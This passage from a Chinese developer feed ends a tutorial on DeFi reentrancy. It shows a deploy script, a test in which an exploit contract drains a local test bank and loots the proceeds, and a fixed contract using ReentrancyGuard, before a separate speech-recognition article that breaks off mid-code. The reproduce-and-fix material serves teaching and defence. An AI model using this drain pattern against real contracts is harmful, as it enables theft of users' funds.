    <span class="hljs-attr">bytecode</span>: <span class="hljs-title class_">ReentrancyExploitArtifact</span>.<span class="hljs-property">bytecode</span>,<span class="hljs-comment">//硬编码</span>
    <span class="hljs-attr">args</span>: [<span class="hljs-title class_">UnsafeBankReceipt</span>.<span class="hljs-property">contractAddress</span>],<span class="hljs-comment">//部署者地址，初始所有者地址</span>
  });
  <span class="hljs-comment">// 等待确认并打印地址</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">ReentrancyExploitReceipt</span> = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: <span class="hljs-title class_">ReentrancyExploitHash</span> });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"攻击合约地址:"</span>, <span class="hljs-title class_">ReentrancyExploitReceipt</span>.<span class="hljs-property">contractAddress</span>);
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
</code></pre>
<h4 data-id="heading-8">测试脚本</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> assert <span class="hljs-keyword">from</span> <span class="hljs-string">"node:assert/strict"</span>;
<span class="hljs-keyword">import</span> { describe, it, beforeEach } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:test"</span>;
<span class="hljs-keyword">import</span> hre <span class="hljs-keyword">from</span> <span class="hljs-string">"hardhat"</span>;
<span class="hljs-keyword">import</span> { parseEther, getAddress, formatEther } <span class="hljs-keyword">from</span> <span class="hljs-string">"viem"</span>;

<span class="hljs-title function_">describe</span>(<span class="hljs-string">"ReentrancyExploit 攻击验证"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">owner</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-attr">otherAccount</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-title class_">UnsafeBank</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-title class_">ReentrancyExploit</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-attr">publicClient</span>: <span class="hljs-built_in">any</span>;

  <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// const viem = await (hre as any).viem;</span>
    <span class="hljs-keyword">const</span> { viem } = <span class="hljs-keyword">await</span> hre.<span class="hljs-property">network</span>.<span class="hljs-title function_">connect</span>();
    publicClient = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getPublicClient</span>();
    [owner, otherAccount] = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getWalletClients</span>();

    <span class="hljs-comment">// 1. 部署银行</span>
    <span class="hljs-title class_">UnsafeBank</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"UnsafeBank"</span>, []);

    <span class="hljs-comment">// 2. 注入“受害者”资金：让其他账户往银行存入 100 ETH</span>
    <span class="hljs-comment">// 这样银行才有钱被偷，且不会消耗 owner 自己的本金</span>
    <span class="hljs-keyword">const</span> depositTx = <span class="hljs-keyword">await</span> otherAccount.<span class="hljs-title function_">sendTransaction</span>({
      <span class="hljs-attr">to</span>: <span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span>,
      <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"100"</span>),
      <span class="hljs-attr">data</span>: <span class="hljs-string">"0xd0e30db0"</span>, <span class="hljs-comment">// 调用 deposit() 的 selector</span>
    });
    <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: depositTx });
        
    <span class="hljs-comment">// 3. 部署攻击合约</span>
    <span class="hljs-title class_">ReentrancyExploit</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"ReentrancyExploit"</span>, [<span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span>]);
  });

  <span class="hljs-title function_">it</span>(<span class="hljs-string">"应该通过重入攻击排干银行余额"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> initialBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span> });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"攻击前银行余额:"</span>, <span class="hljs-title function_">formatEther</span>(initialBankBal.<span class="hljs-title function_">toString</span>()));

    <span class="hljs-comment">// 1. 执行攻击 (存入 10 ETH 触发递归 withdraw)</span>
    <span class="hljs-comment">// 注意：gasLimit 必须给够，因为递归非常消耗 Gas</span>
    <span class="hljs-keyword">const</span> attackTx = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">write</span>.<span class="hljs-title function_">attack</span>([], {
      <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"10"</span>),
      <span class="hljs-attr">gas</span>: <span class="hljs-number">1000000n</span> 
    });
    <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: attackTx });

    <span class="hljs-comment">// 2. 检查攻击合约是否成功拿到了钱</span>
    <span class="hljs-keyword">const</span> exploitBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">address</span> });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"攻击后合约所得:"</span>, <span class="hljs-title function_">formatEther</span>(exploitBal.<span class="hljs-title function_">toString</span>()));
    
    <span class="hljs-comment">// 修复断言 1：合约所得应该等于 (银行初始 100 + 攻击投入 10)</span>
    assert.<span class="hljs-title function_">ok</span>(exploitBal &gt;= <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"110"</span>));

    <span class="hljs-comment">// 提取战利品</span>
    <span class="hljs-keyword">const</span> initialOwnerBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: owner.<span class="hljs-property">account</span>.<span class="hljs-property">address</span> });
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">write</span>.<span class="hljs-title function_">loot</span>([]);

    <span class="hljs-comment">// 修复断言 2：Owner 余额增加量应该接近 110 ETH（扣除微量 Gas）</span>
    <span class="hljs-keyword">const</span> finalOwnerBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: owner.<span class="hljs-property">account</span>.<span class="hljs-property">address</span> });

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Owner 增加余额:"</span>, (finalOwnerBal - initialOwnerBal).<span class="hljs-title function_">toString</span>());
    
    <span class="hljs-comment">// 只要增加超过 109 ETH 即可说明成功拿到了银行的所有钱</span>
    assert.<span class="hljs-title function_">ok</span>(finalOwnerBal &gt; initialOwnerBal + <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"109"</span>));
    
    <span class="hljs-comment">// 修复断言 3：银行必须被排干</span>
    <span class="hljs-keyword">const</span> finalBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span> });
    assert.<span class="hljs-title function_">equal</span>(finalBankBal, <span class="hljs-number">0n</span>);
  });
});
</code></pre>
<h3 data-id="heading-9">漏洞修复</h3>
<h4 data-id="heading-10">智能合约</h4>
<ul>
<li><strong>安全漏洞修复合约</strong>:借助openzeppelinV5修复</li>
</ul>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span>.<span class="hljs-number">24</span>;

<span class="hljs-comment">// 导入 OpenZeppelin V5 的防重入卫士</span>
import <span class="hljs-string">"@openzeppelin/contracts/utils/ReentrancyGuard.sol"</span>;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@title</span> SafeBank
 * <span class="hljs-doctag">@dev</span> 修复了重入漏洞的安全银行合约
 */</span>
contract SafeBank is ReentrancyGuard {
    <span class="hljs-title function_ invoke__">mapping</span>(address =&gt; uint256) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-comment">// 存钱逻辑保持不变</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> </span>{
        balances[msg.sender] += msg.value;
    }

    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@dev</span> 修复后的取款函数
     * 1. 使用 nonReentrant 修改器：禁止在执行期间再次进入此函数
     * 2. 遵循 Checks-Effects-Interactions 模式
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> <span class="hljs-title">nonReentrant</span> </span>{
        <span class="hljs-comment">// --- 1. Checks (检查) ---</span>
        uint256 amount = balances[msg.sender];
        <span class="hljs-keyword">require</span>(amount &gt; <span class="hljs-number">0</span>, <span class="hljs-string">"no fund"</span>);

        <span class="hljs-comment">// --- 2. Effects (效果) ---</span>
        <span class="hljs-comment">// 在进行外部调用之前，先更新状态（账本清零）</span>
        <span class="hljs-comment">// 即使攻击者尝试重入，此时它的 balances[msg.sender] 已经是 0，无法通过 Checks</span>
        balances[msg.sender] = <span class="hljs-number">0</span>;

        <span class="hljs-comment">// --- 3. Interactions (交互) ---</span>
        <span class="hljs-comment">// 最后再进行外部转账</span>
        (<span class="hljs-keyword">bool</span> ok, ) = msg.sender.call{value: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-keyword">require</span>(ok, <span class="hljs-string">"send failed"</span>);
    }

    <span class="hljs-comment">// 允许合约接收 ETH</span>
    <span class="hljs-title function_ invoke__">receive</span>() external payable {}
}

</code></pre>
<ul>
<li><strong>重入攻击合约</strong>：同上重入攻击合约</li>
</ul>
<h4 data-id="heading-11">部署脚本：同上部署脚本修改编译后abi关键参数即可</h4>
<h4 data-id="heading-12">测试脚本</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> assert <span class="hljs-keyword">from</span> <span class="hljs-string">"node:assert/strict"</span>;
<span class="hljs-keyword">import</span> { describe, it, beforeEach } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:test"</span>;
<span class="hljs-keyword">import</span> hre <span class="hljs-keyword">from</span> <span class="hljs-string">"hardhat"</span>;
<span class="hljs-keyword">import</span> { parseEther, getAddress, formatEther } <span class="hljs-keyword">from</span> <span class="hljs-string">"viem"</span>;
<span class="hljs-title function_">describe</span>(<span class="hljs-string">"SafeBank 防御验证"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">owner</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-attr">otherAccount</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-title class_">SafeBank</span>: <span class="hljs-built_in">any</span>; <span class="hljs-comment">// 使用 SafeBank 代替 UnsafeBank</span>
    <span class="hljs-keyword">let</span> <span class="hljs-title class_">ReentrancyExploit</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-attr">publicClient</span>: <span class="hljs-built_in">any</span>;

    <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> () =&gt; {
        <span class="hljs-keyword">const</span> { viem } = <span class="hljs-keyword">await</span> hre.<span class="hljs-property">network</span>.<span class="hljs-title function_">connect</span>();
        publicClient = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getPublicClient</span>();
        [owner, otherAccount] = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getWalletClients</span>();

        <span class="hljs-comment">// 1. 部署安全的银行合约</span>
        <span class="hljs-title class_">SafeBank</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"SafeBank"</span>, []); <span class="hljs-comment">// 注意合约名称变更</span>
        
        <span class="hljs-comment">// 2. 注入“受害者”资金：100 ETH</span>
        <span class="hljs-keyword">const</span> depositTx = <span class="hljs-keyword">await</span> otherAccount.<span class="hljs-title function_">sendTransaction</span>({
            <span class="hljs-attr">to</span>: <span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span>,
            <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"100"</span>),
            <span class="hljs-attr">data</span>: <span class="hljs-string">"0xd0e30db0"</span>, <span class="hljs-comment">// 调用 deposit() 的 selector</span>
        });
        <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: depositTx });
            
        <span class="hljs-comment">// 3. 部署攻击合约，指向 SafeBank</span>
        <span class="hljs-title class_">ReentrancyExploit</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"ReentrancyExploit"</span>, [<span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span>]);
    });

    <span class="hljs-title function_">it</span>(<span class="hljs-string">"应该阻止 ReentrancyExploit 的攻击"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> initialBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"安全银行攻击前余额:"</span>, <span class="hljs-title function_">formatEther</span>(initialBankBal.<span class="hljs-title function_">toString</span>())); <span class="hljs-comment">// 100 ETH</span>

        <span class="hljs-comment">// 尝试执行攻击</span>
        <span class="hljs-comment">// 我们预期这个交易会失败（revert），因为 SafeBank 使用了 ReentrancyGuard</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">await</span> <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">write</span>.<span class="hljs-title function_">attack</span>([], {
                <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"10"</span>), <span class="hljs-comment">// 存入 10 ETH</span>
                <span class="hljs-attr">gas</span>: <span class="hljs-number">3000000n</span> <span class="hljs-comment">// Gas 不用太高，因为它很快就会失败</span>
            });
            <span class="hljs-comment">// 如果代码执行到这里，说明攻击成功了，这不符合预期</span>
            assert.<span class="hljs-title function_">fail</span>(<span class="hljs-string">"攻击应该失败，但它成功了！"</span>);

        } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
            <span class="hljs-comment">// 预期捕获到错误，证明防御成功</span>
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"成功捕获到预期错误：攻击被阻止。"</span>);
            <span class="hljs-comment">// 打印错误消息通常会包含 "ReentrancyGuard: reentrant call" 或 "no fund"</span>
            <span class="hljs-comment">// console.error(error.message); </span>
            assert.<span class="hljs-title function_">ok</span>(error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"revert"</span>) || error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"ReentrancyGuard"</span>) || error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"no fund"</span>));
        }

        <span class="hljs-comment">// 验证最终银行余额：钱应该还在银行里（除了攻击者存入的 10 ETH 可能卡在失败的交易中）</span>
        <span class="hljs-comment">// 在 Viem/Hardhat 中，失败的交易会自动回滚所有状态，所以银行余额应该回到初始状态。</span>
        <span class="hljs-keyword">const</span> finalBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"安全银行攻击后余额:"</span>, <span class="hljs-title function_">formatEther</span>(finalBankBal.<span class="hljs-title function_">toString</span>()));

        <span class="hljs-comment">// 断言银行余额没有被掏空 (回到了 100 ETH 附近)</span>
        assert.<span class="hljs-title function_">ok</span>(finalBankBal &gt;= <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"99"</span>)); 

        <span class="hljs-keyword">const</span> exploitBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">address</span> });
        assert.<span class="hljs-title function_">equal</span>(exploitBal, <span class="hljs-number">0n</span>, <span class="hljs-string">"攻击合约不应该有余额"</span>);
    });
});
</code></pre>
<h2 data-id="heading-13">结语</h2>
<p>至此关于 DeFi 领域经典安全漏洞 —— 重入攻击，完整覆盖相关理论知识与代码实践，既包含重入攻击的复现过程，也提供了针对该漏洞的修复代码实例，形成 “理论剖析 - 实践复现 - 漏洞修复” 的完整技术链路。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[网页端语音识别技术使用方案]]></title>    <link>https://juejin.cn/post/7596970073749454884</link>    <guid>https://juejin.cn/post/7596970073749454884</guid>    <pubDate>2026-01-20T00:30:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596970073749454884" data-draft-id="7596966040920948742" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="网页端语音识别技术使用方案"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-20T00:30:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="蛤蟆大王有话说"/> <meta itemprop="url" content="https://juejin.cn/user/4314940145153879"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            网页端语音识别技术使用方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4314940145153879/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    蛤蟆大王有话说
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:30:18.000Z" title="Tue Jan 20 2026 00:30:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>需求：项目是一个支持PC和手机端的 ai 对话平台，需要支持用户语音输入问题，ai 回答。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c06390ed0c004a2b8870baf02c150480~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=U1cxEbU6e3IHUvdBafk1BHKDmkc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">方案a ：浏览器提供 webkitSpeechRecognition 可以直接识别用户语音并转换文字。</h2>
<h3 data-id="heading-1">使用：</h3>
<pre><code class="hljs language-ini" lang="ini">
// 检测是否支持 Web Speech <span class="hljs-attr">API</span> ===
const <span class="hljs-attr">isWebSpeechSupported</span> = typeof window !== <span class="hljs-string">'undefined'</span> &amp;&amp; !!(window.SpeechRecognition || window.webkitSpeechRecognition)<span class="hljs-comment">;</span>
if(!isWebSpeechSupported) return alert("不支持语音识别！")
<span class="hljs-attr">recognition</span> = new webkitSpeechRecognition()<span class="hljs-comment">;</span>
<span class="hljs-attr">recognition.lang</span> = <span class="hljs-string">'zh-CN'</span><span class="hljs-comment">; // 设置语音识别的语言为中文</span>
<span class="hljs-attr">recognition.continuous</span> = <span class="hljs-literal">true</span>

<span class="hljs-attr">recognition.onresult</span> = (event) =&gt; {
  const <span class="hljs-attr">speechResult</span> = event.results[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].transcript<span class="hljs-comment">;</span>
  console.log("语音识别结果：", speechResult)<span class="hljs-comment">;</span>
  eventBus.emit('senMsg', speechResult)<span class="hljs-comment">;  // 自己的业务代码</span>
}<span class="hljs-comment">;</span>
<span class="hljs-attr">recognition.onerror</span> = (event) =&gt; {
  console.log("发生错误：", event.error)<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>recognition.start() 开始录音</p>
<p>recognition.stop() 结束录音 -- 会执行 onresult 回调函数返回识别语音文字</p>
<p>recognition.abort() 终止所有操作 - 不会执行 onresult 回调函数</p>
<h3 data-id="heading-2">缺陷：SpeechRecognition 不支持IOS平台。</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93360fe0889d4ec3b7094d12d72a0420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=90fG4yGQYFpxc4Kgqx2poSWWqMs%3D" alt="" loading="lazy"/></p>
<p>图片来源：ai</p>
<h2 data-id="heading-3">方案b：<strong>前端录音 + 后端 ASR（语音转文字）</strong></h2>
<p>用户点击“开始说话” → 前端调用麦克风录制音频（WAV/MP3） → 上传音频到服务器 → 服务器调用 ASR 引擎（如阿里云、腾讯云、百度、Google Cloud） → 返回识别文本给前端</p>
<h3 data-id="heading-4">使用：这里使用百度 ASR，音频流需要转换 PCM 二进制</h3>
<p>pcm和blob的区别：pcm是原始音频数据的编码格式， Blob（Binary Large Object）是浏览器中用于封装二进制数据的容器对象</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23ba88cbbf7d47fc90cd659f12a43622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=%2FtMaeIrRA%2BMf6CbzxSJK4c2TTcA%3D" alt="" loading="lazy"/></p>
<p>图片来源 ：ai</p>
<p>相关代码：</p>
<pre><code class="hljs language-ini" lang="ini">try {
  let <span class="hljs-attr">recognition</span> = null
  let chunks: Blob<span class="hljs-section">[]</span> = <span class="hljs-section">[]</span><span class="hljs-comment">;</span>
  // 请求麦克风权限准备录音
  let <span class="hljs-attr">stream</span> = await navigator.mediaDevices.getUserMedia({ audio: <span class="hljs-literal">true</span> })<span class="hljs-comment">;</span>
  <span class="hljs-attr">recognition</span> = new MediaRecorder(stream)<span class="hljs-comment">;</span>
  // 监听录音数据 并收集到 chunks 二进制数组
  <span class="hljs-attr">recognition.ondataavailable</span> = (e) =&gt; {
    <span class="hljs-attr">chunks</span> = []
    <span class="hljs-attr">chunks.length</span> = <span class="hljs-number">0</span>
    if (e.data.size &gt; 0) {
